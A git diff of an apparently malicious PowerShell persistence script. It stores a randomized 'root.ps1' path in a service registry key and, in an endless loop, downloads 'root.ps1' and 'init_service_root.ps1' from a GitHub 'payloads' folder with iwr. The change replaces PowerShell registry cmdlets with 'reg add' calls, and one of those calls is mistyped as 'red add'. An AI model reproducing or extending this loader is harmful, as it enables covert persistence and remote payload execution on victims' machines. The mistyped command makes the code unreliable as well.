@@ -16,18 +16,20 @@ $paths = @(
 $serviceName = "MyRootService" # change this to the name of the service
 $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"
 $propertyName = "root"
-$item = Get-ItemProperty -Path "$basePath" -Name $propertyName -ErrorAction SilentlyContinue
+$item = Get-ItemProperty -Path "$basePath" -Name $propertyName
 $canUpdateRootPath = $false
 
 if((($rootPath -eq $null) -or ($rootPath -eq "")) -and -not($item)){
     $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
     $rootPath = "$rootPath\root.ps1"
-    New-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootPath -Force | Out-Null
+    red add "$basePath" /v $propertyName /t REG_SZ /d $rootPath /f
+    #New-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootPath -Force | Out-Null
     $canUpdateRootPath = $true
 }
 
 if (-not($item)) {
-    New-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootPath -Force | Out-Null
+    red add "$basePath" /v $propertyName /t REG_SZ /d $rootPath /f
+    #New-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootPath -Force | Out-Null
     $canUpdateRootPath = $false
 }
 
@@ -71,7 +73,8 @@ while ($true) {
         if($canUpdateRootPath){
             $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
             $rootPath = "$rootPath\root.ps1"
-            Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootPath -Force | Out-Null
+            reg add "$basePath" /v $propertyName /t REG_SZ /d $rootPath /f
+            #Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootPath -Force | Out-Null
         }
         iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/root.ps1" -OutFile $rootPath
         iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_root.ps1" -OutFile $initServicePath
